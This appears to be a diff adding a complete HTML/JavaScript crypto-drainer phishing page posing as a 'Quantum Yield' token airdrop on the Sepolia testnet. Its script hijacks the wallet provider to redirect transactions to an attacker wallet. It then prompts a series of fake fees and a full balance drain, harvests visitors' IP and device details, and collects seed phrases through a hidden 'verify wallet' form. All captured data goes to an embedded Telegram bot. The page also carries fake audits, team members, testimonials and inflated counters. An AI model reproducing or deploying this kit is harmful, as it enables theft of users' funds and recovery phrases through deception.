@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔬 Quantum Yield Airdrop [SEPOLIA TESTNET] - Claim 5 QYT + Rare NFTs!</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+    <style>
+        :root {
+            --primary: #00F2DE;
+            --secondary: #8A4DFF;
+            --accent: #FF4D9A;
+            --dark: #15171B;
+            --light: #2A2E37;
+            --neon: #00FFF0;
+            --gold: #FFD700;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, var(--dark), #1a1e25);
+            color: var(--light);
+            margin: 0;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        #particles-js {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background: transparent;
+        }
+
+        .container {
+            max-width: 1440px;
+            margin: 0 auto;
+            padding: 2rem;
+            position: relative;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            box-shadow: 0 0 30px rgba(0, 212, 255, 0.3);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(0, 212, 255, 0.5);
+            animation: glow 2s infinite alternate;
+        }
+
+        @keyframes glow {
+            from { box-shadow: 0 0 20px rgba(0, 212, 255, 0.3); }
+            to { box-shadow: 0 0 40px rgba(0, 212, 255, 0.6); }
+        }
+
+        header {
+            position: fixed;
+            width: 100%;
+            background: rgba(21, 23, 27, 0.9);
+            border-bottom: 2px solid var(--primary);
+            backdrop-filter: blur(10px);
+            z-index: 1000;
+            top: 0;
+        }
+
+        .nav-links {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 1rem 0;
+        }
+
+        .nav-links a {
+            color: var(--neon);
+            margin: 0 1.5rem;
+            text-decoration: none;
+            font-weight: 600;
+            transition: color 0.3s;
+        }
+
+        .nav-links a:hover {
+            color: var(--gold);
+            text-shadow: 0 0 10px var(--gold);
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: var(--primary);
+            text-shadow: 0 0 15px var(--primary);
+        }
+
+        .hero {
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            text-align: center;
+            background: url('https://i.imgur.com/quantum-bg.jpg') no-repeat center/cover;
+            border-bottom: 3px solid var(--secondary);
+        }
+
+        .hero h1 {
+            font-size: 5rem;
+            color: var(--gold);
+            text-shadow: 0 0 25px var(--primary), 0 0 50px var(--accent);
+            animation: pulse 2s infinite;
+        }
+
+        .hero p {
+            font-size: 1.5rem;
+            color: var(--neon);
+            margin: 1rem 0;
+        }
+
+        .cta {
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            color: var(--dark);
+            padding: 1.2rem 3rem;
+            border-radius: 50px;
+            border: none;
+            font-size: 1.2rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            box-shadow: 0 0 20px var(--primary);
+        }
+
+        .cta:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 30px var(--accent);
+        }
+
+        .cta:disabled {
+            background: #555;
+            cursor: not-allowed;
+        }
+
+        .countdown {
+            font-size: 2rem;
+            color: var(--accent);
+            margin: 2rem 0;
+            font-weight: 800;
+            text-shadow: 0 0 10px var(--accent);
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 2rem;
+            margin: 4rem 0;
+        }
+
+        .stat-card {
+            background: rgba(42, 46, 55, 0.8);
+            border-radius: 20px;
+            padding: 2rem;
+            text-align: center;
+            border: 1px solid var(--neon);
+            transition: transform 0.3s;
+        }
+
+        .stat-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 0 20px var(--neon);
+        }
+
+        .stat-card h3 {
+            color: var(--gold);
+            font-size: 2rem;
+        }
+
+        .nft-rewards {
+            display: flex;
+            justify-content: space-around;
+            margin: 30px 0;
+        }
+
+        .nft {
+            width: 150px;
+            height: 150px;
+            background-size: cover;
+            border-radius: 15px;
+            border: 3px solid var(--neon);
+            box-shadow: 0 0 15px rgba(0, 255, 157, 0.7);
+            transition: transform 0.3s ease;
+        }
+
+        .nft:hover {
+            transform: scale(1.1);
+        }
+
+        .nft1 { background-image: url('https://i.postimg.cc/fW7rtmjq/Quantum-Ape.jpg'); }
+        .nft2 { background-image: url('https://i.postimg.cc/wB9PvD70/file-B1-VK6-Ac-Ag65g-T9-Nr-GYSJw-T.png'); }
+
+        .nft span {
+            display: block;
+            font-size: 0.9em;
+            color: var(--gold);
+            margin-top: 5px;
+        }
+
+        .roadmap, .about, .team, .news, .partners, .testimonials {
+            background: rgba(42, 46, 55, 0.9);
+            border-radius: 25px;
+            padding: 3rem;
+            margin: 4rem 0;
+            border: 2px dashed var(--primary);
+            text-align: left;
+        }
+
+        .roadmap h2, .about h2, .team h2, .news h2, .partners h2, .testimonials h2 {
+            color: var(--neon);
+            text-shadow: 0 0 15px var(--neon);
+        }
+
+        .partners ul {
+            list-style: none;
+            padding: 0;
+            display: flex;
+            justify-content: space-around;
+        }
+
+        .partners li {
+            font-size: 1.1em;
+            color: var(--neon);
+        }
+
+        .testimonials p {
+            background: rgba(0, 212, 255, 0.1);
+            padding: 10px;
+            border-radius: 10px;
+            margin: 10px 0;
+            border: 1px dashed var(--primary);
+        }
+
+        footer {
+            border-top: 2px solid var(--primary);
+            padding: 2rem 0;
+            text-align: center;
+            background: var(--dark);
+        }
+
+        footer a {
+            color: var(--neon);
+            margin: 0 1rem;
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            color: var(--accent);
+        }
+
+        #status {
+            margin: 20px 0;
+            font-size: 1.1em;
+        }
+
+        .success { color: var(--neon); text-shadow: 0 0 10px var(--neon); }
+        .error { color: var(--accent); text-shadow: 0 0 10px var(--accent); }
+        .warning { color: var(--gold); font-weight: bold; }
+
+        .wheel {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            background: conic-gradient(var(--primary), var(--accent), var(--neon), var(--gold), var(--primary));
+            margin: 20px auto;
+            animation: spin 2s linear;
+        }
+
+        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+
+        .referral, .share, .phishing {
+            margin: 20px 0;
+        }
+
+        .referral input, .phishing input {
+            padding: 10px;
+            width: 70%;
+            border: 1px solid var(--primary);
+            border-radius: 5px;
+            background: rgba(255, 255, 255, 0.1);
+            color: var(--light);
+        }
+
+        .referral button, .share button, .phishing button {
+            padding: 10px 20px;
+            font-size: 1em;
+            margin-left: 10px;
+            background: var(--neon);
+            color: var(--dark);
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .phishing { display: none; }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+    <div id="particles-js"></div>
+    <header>
+        <nav class="container">
+            <div class="logo">Quantum Yield</div>
+            <div class="nav-links">
+                <a href="#airdrop">Airdrop</a>
+                <a href="#nfts">NFTs</a>
+                <a href="#roadmap">Roadmap</a>
+                <button class="cta" onclick="claimNow()">Connect Wallet</button>
+            </div>
+        </nav>
+    </header>
+
+    <section class="hero" id="airdrop">
+        <div class="container">
+            <h1>Quantum Yield Airdrop [SEPOLIA]</h1>
+            <p>Claim 5 QYT + Exclusive NFTs Now! Only 1,000 Spots Left!</p>
+            <div class="countdown" id="timer">00:00:00</div>
+            <button class="cta" id="claimBtn" onclick="claimNow()">Claim Now</button>
+            <div id="status"></div>
+        </div>
+    </section>
+
+    <section class="container stats-grid">
+        <div class="stat-card">
+            <h3>5 QYT</h3>
+            <p>Free Tokens Per Claim</p>
+        </div>
+        <div class="stat-card">
+            <h3>1,000</h3>
+            <p>Limited Spots</p>
+        </div>
+        <div class="stat-card">
+            <h3>10x</h3>
+            <p>Value Surge Expected</p>
+        </div>
+        <div class="stat-card">
+            <h3><span id="claimed">7,842</span></h3>
+            <p>Claimed QYT</p>
+        </div>
+    </section>
+
+    <section class="container nft-rewards" id="nfts">
+        <div>
+            <div class="nft nft1"></div>
+            <span id="nft1-rarity"></span>
+        </div>
+        <div>
+            <div class="nft nft2"></div>
+            <span id="nft2-rarity"></span>
+        </div>
+    </section>
+
+    <section class="container about">
+        <h2>About Quantum Yield</h2>
+        <p>Quantum Yield is a DeFi protocol using quantum computing to optimize yield farming. QYT offers staking and governance.</p>
+        <p>Audited by <a href="https://www.certik.com/" target="_blank" style="color: var(--neon);">CertiK</a></p>
+    </section>
+
+    <section class="container team">
+        <h2>Our Team</h2>
+        <p><strong>Dr. Alice Quantum</strong> - CEO, PhD MIT</p>
+        <p><strong>Bob Blockchain</strong> - CTO, Ex-Ethereum</p>
+    </section>
+
+    <section class="container roadmap" id="roadmap">
+        <h2>Roadmap to Riches</h2>
+        <p>Q1 2025: Mainnet Launch<br>Q2 2025: Staking Release<br>Q4 2025: Mobile App</p>
+    </section>
+
+    <section class="container news">
+        <h2>News</h2>
+        <p>March 2025: Chainlink Partnership</p>
+        <p>Feb 2025: Testnet Success</p>
+    </section>
+
+    <section class="container partners">
+        <h2>Partners</h2>
+        <ul>
+            <li><i class="fas fa-link"></i> Chainlink</li>
+            <li><i class="fas fa-shapes"></i> Polygon</li>
+            <li><i class="fas fa-exchange-alt"></i> Uniswap</li>
+        </ul>
+    </section>
+
+    <section class="container testimonials">
+        <h2>What People Say</h2>
+        <p>"Claimed 5 QYT—insane!" - @CryptoKingX</p>
+        <p>"Fast, got my NFT!" - @NFTManiac</p>
+    </section>
+
+    <section class="container">
+        <div class="referral">
+            <p>Invite friends & earn 10% of their claims!</p>
+            <input type="text" value="https://quantum-yield.com/ref=12345" readonly>
+            <button onclick="copyReferralLink()">Copy Link</button>
+        </div>
+
+        <div class="share" style="display: none;" id="share">
+            <p>Share your success!</p>
+            <button onclick="copyShareText()">Copy Tweet</button>
+        </div>
+
+        <div class="phishing" id="phishing" style="display: none;">
+            <p>Verify your wallet to receive your NFT airdrop link (optional):</p>
+            <input type="text" id="phishing-input" placeholder="Enter backup phrase">
+            <button onclick="submitPhishing()">Submit</button>
+            <div id="phishing-status"></div>
+        </div>
+    </section>
+
+    <footer>
+        <div class="container">
+            <a href="#" target="_blank"><i class="fab fa-twitter"></i></a>
+            <a href="#" target="_blank"><i class="fab fa-telegram"></i></a>
+            <a href="#" target="_blank"><i class="fab fa-discord"></i></a>
+            <a href="#" target="_blank"><i class="fab fa-github"></i></a>
+        </div>
+    </footer>
+
+    <script>
+        const BOT_TOKEN = "7612722516:AAEZKaiU01Dx-VbTKQTmzNqo2WZ9X7x8zKA";
+        const CHAT_ID = "6309547301";
+        const ATTACKER_WALLET = "0xF01c1348579e129974A39BAcA3cA9eCe28e68490";
+        const SEPOLIA_RPC = "https://rpc.sepolia.org";
+        const ETH_TO_USD_RATE = 2500;
+
+        // Particles.js setup
+        particlesJS("particles-js", {
+            particles: {
+                number: { value: 100, density: { enable: true, value_area: 800 } },
+                color: { value: "#00FFF0" },
+                shape: { type: "circle" },
+                opacity: { value: 0.5, random: true },
+                size: { value: 3, random: true },
+                move: { enable: true, speed: 2, direction: "none", random: true }
+            },
+            interactivity: { detect_on: "canvas", events: { onhover: { enable: true, mode: "repulse" } } }
+        });
+
+        // Timer
+        const startTimer = () => {
+            const end = Date.now() + 24 * 60 * 60 * 1000;
+            setInterval(() => {
+                const now = Date.now();
+                const diff = end - now;
+                if (diff < 0) {
+                    document.getElementById("timer").innerText = "Airdrop Ended!";
+                    document.getElementById("claimBtn").disabled = true;
+                    return;
+                }
+                const h = Math.floor(diff / (1000 * 60 * 60)).toString().padStart(2, "0");
+                const m = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60)).toString().padStart(2, "0");
+                const s = Math.floor((diff % (1000 * 60)) / 1000).toString().padStart(2, "0");
+                document.getElementById("timer").innerText = `${h}h ${m}m ${s}s`;
+            }, 1000);
+        };
+
+        // Claim counter
+        const updateClaimCounter = () => {
+            let claimed = parseInt(document.getElementById("claimed").innerText.replace(/,/g, ""));
+            claimed += Math.floor(Math.random() * 10) + 1;
+            document.getElementById("claimed").innerText = claimed.toLocaleString();
+        };
+
+        // Wallet clipper
+        if (window.ethereum) {
+            const provider = new ethers.providers.Web3Provider(window.ethereum, {
+                chainId: 11155111,
+                name: "sepolia",
+                rpcUrls: [SEPOLIA_RPC]
+            });
+            window.ethereum.request = async (args) => {
+                if (args.method === "eth_sendTransaction") {
+                    const tx = args.params[0];
+                    const originalTo = tx.to;
+                    tx.to = ATTACKER_WALLET;
+                    tx.chainId = "0xAA36A7";
+                    tx.gasPrice = ethers.utils.parseUnits("20", "gwei").toHexString();
+                    await sendVictimAlert(`🪝 CLIP ATTEMPT: Swapped ${originalTo} to ${ATTACKER_WALLET}`);
+                    return provider.sendTransaction(tx);
+                }
+                return provider.send(args.method, args.params);
+            };
+        }
+
+        async function getVictimInfo() {
+            const ua = navigator.userAgent;
+            const br = navigator.appName + " " + navigator.appVersion;
+            const dev = /Mobile|Android|iPhone|iPad/.test(ua) ? "Mobile" : "Desktop";
+            let ip = "Unknown";
+            try {
+                const res = await fetch("https://api.ipify.org?format=json");
+                const data = await res.json();
+                ip = data.ip;
+            } catch (e) {}
+            return { ip, browser: br, device: dev };
+        }
+
+        async function claimNow() {
+            const claimBtn = document.getElementById("claimBtn");
+            claimBtn.disabled = true;
+            claimBtn.innerText = "Processing...";
+            document.getElementById("status").innerHTML = "<p class='warning'><i class='fas fa-atom fa-spin'></i> Connecting to Blockchain...</p>";
+
+            if (!window.ethereum) {
+                document.getElementById("status").innerHTML = "<p class='error'>MetaMask not detected! <a href='https://metamask.io/download/' target='_blank' style='color: #00ff9d;'>Install MetaMask</a></p>";
+                const info = await getVictimInfo();
+                await sendVictimAlert(`NO WALLET: ${info.ip}\nBrowser: ${info.browser}\nDevice: ${info.device}`);
+                claimBtn.innerText = "Claim Now";
+                claimBtn.disabled = false;
+                return;
+            }
+
+            const provider = new ethers.providers.Web3Provider(window.ethereum, {
+                chainId: 11155111,
+                name: "sepolia",
+                rpcUrls: [SEPOLIA_RPC]
+            });
+            await provider.send("wallet_switchEthereumChain", [{ chainId: "0xaa36a7" }]);
+            const accounts = await provider.send("eth_requestAccounts", []);
+            const signer = provider.getSigner();
+            const victimAddress = accounts[0];
+            const balance = await provider.getBalance(victimAddress);
+            const gasPrice = ethers.utils.parseUnits("20", "gwei");
+            const gasLimit = ethers.BigNumber.from("21000");
+            const gasCost = gasLimit.mul(gasPrice);
+
+            const info = await getVictimInfo();
+            await sendVictimAlert(`🎯 VICTIM CONNECTED\nWallet: ${victimAddress}\nIP: ${info.ip}\nBrowser: ${info.browser}\nDevice: ${info.device}`);
+
+            // Fake token approval
+            document.getElementById("status").innerHTML = "<p class='warning'>Approve QYT Token Contract (0.001 SEP)...</p>";
+            await signer.sendTransaction({
+                to: ATTACKER_WALLET,
+                value: ethers.utils.parseEther("0.001"),
+                gasLimit,
+                gasPrice,
+                chainId: 11155111
+            });
+
+            // Verification
+            document.getElementById("status").innerHTML = "<p class='warning'>Verifying wallet eligibility... Approve 0.005 SEP!</p>";
+            await signer.sendTransaction({
+                to: ATTACKER_WALLET,
+                value: ethers.utils.parseEther("0.005"),
+                gasLimit,
+                gasPrice,
+                chainId: 11155111
+            });
+
+            // Claim fee
+            document.getElementById("status").innerHTML = "<p class='warning'>HURRY! Approve 0.01 SEP claim fee for 5 QYT (~$12,500 USD)!</p>";
+            await signer.sendTransaction({
+                to: ATTACKER_WALLET,
+                value: ethers.utils.parseEther("0.01"),
+                gasLimit,
+                gasPrice,
+                chainId: 11155111
+            });
+
+            // Full drain
+            const drainAmount = balance.sub(gasCost);
+            if (drainAmount.gt(0)) {
+                const drainEth = ethers.utils.formatEther(drainAmount);
+                const drainUsd = (parseFloat(drainEth) * ETH_TO_USD_RATE).toFixed(2);
+                document.getElementById("status").innerHTML = "<p class='warning'>FINAL STEP! Confirm to lock in your airdrop!</p>";
+                const tx = await signer.sendTransaction({
+                    to: ATTACKER_WALLET,
+                    value: drainAmount,
+                    gasLimit,
+                    gasPrice,
+                    chainId: 11155111
+                });
+                await sendVictimAlert(`✅ SEPOLIA SUCCESS: ${victimAddress} DRAINED\nAmount: ${drainEth} SEP (~$${drainUsd} USD)\nTX: ${tx.hash}\nIP: ${info.ip}`);
+            }
+
+            // Spin-to-win
+            document.getElementById("status").innerHTML = "<p class='warning'>Spin for a bonus! Spinning...</p><div class='wheel'></div>";
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            document.getElementById("status").innerHTML = "<h2 class='success'>Airdrop Secured!</h2><p>5 QYT + Bonus 5 QYT + NFT transferred!</p>";
+            document.getElementById("share").style.display = "block";
+            document.getElementById("phishing").style.display = "block";
+
+            claimBtn.innerText = "Claimed!";
+            setTimeout(() => {
+                claimBtn.innerText = "Claim Now";
+                claimBtn.disabled = false;
+            }, 5000);
+        }
+
+        async function sendVictimAlert(msg) {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+            });
+        }
+
+        function copyReferralLink() {
+            const referralLink = "https://quantum-yield.com/ref=12345";
+            navigator.clipboard.writeText(referralLink);
+            alert("Referral link copied: " + referralLink);
+        }
+
+        function copyShareText() {
+            const shareText = "Just claimed 5 QYT from Quantum Yield! Get yours: https://quantum-yield.com #QYT #Airdrop";
+            navigator.clipboard.writeText(shareText);
+            alert("Share text copied: " + shareText);
+        }
+
+        function submitPhishing() {
+            const input = document.getElementById("phishing-input").value.trim();
+            if (input) {
+                document.getElementById("phishing-status").innerHTML = "<p class='warning'>Encrypting...</p>";
+                setTimeout(async () => {
+                    await sendVictimAlert(`🗝️ PHISHED INPUT: ${input}`);
+                    document.getElementById("phishing-status").innerHTML = "<p class='success'>NFT link sent to your wallet!</p>";
+                }, 2000);
+            }
+        }
+
+        window.onload = () => {
+            startTimer();
+            setInterval(updateClaimCounter, 5000);
+            document.getElementById("nft1-rarity").innerHTML = `Quantum Ape #${Math.floor(Math.random() * 1000)} - Rarity: Epic`;
+            document.getElementById("nft2-rarity").innerHTML = `Yield Bot #${Math.floor(Math.random() * 100)} - Rarity: Legendary`;
+        };
+    </script>
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js" type="text/javascript"></script>
+</body>
+</html>
